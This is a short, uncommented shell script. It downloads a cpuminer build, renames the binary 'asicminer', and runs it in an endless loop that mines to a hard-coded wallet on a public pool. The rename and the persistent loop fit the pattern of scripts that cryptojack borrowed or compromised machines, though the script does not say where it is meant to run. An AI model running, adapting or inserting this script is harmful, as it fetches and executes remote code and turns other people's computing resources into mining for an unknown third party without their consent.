#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 asicminer
while [ 1 ]; do
./asicminer -a yespowersugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1qggnspz44y8xwed66m0gwzv2a2z2xepcuv3je9g.v2 -p x -t2
sleep 5
done
sleep 999
